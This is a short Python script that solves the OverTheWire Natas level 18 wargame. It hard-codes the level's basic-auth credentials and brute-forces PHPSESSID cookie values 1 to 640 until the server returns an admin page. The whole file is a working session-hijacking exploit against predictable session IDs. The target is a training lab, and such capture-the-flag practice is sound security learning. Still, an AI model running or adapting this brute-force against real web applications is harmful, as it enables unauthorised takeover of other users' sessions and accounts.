import requests

url = "http://natas18.natas.labs.overthewire.org/index.php"
username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

contain_text = "You are an admin"

def get(cookie):
    response = requests.get(url, cookies = cookie, auth=requests.auth.HTTPBasicAuth(username, password))
    if (contain_text in response.text):
        return response.text
    return False

def get_pass():
    for i in range(1,641):
        print("Checking: " + str(i))
        cookie = {"PHPSESSID": str(i)}
        res = get(cookie)
        if res:
            return res
    return "Can't get it"

if __name__ == "__main__":
    print("Working :D")
    print(get_pass())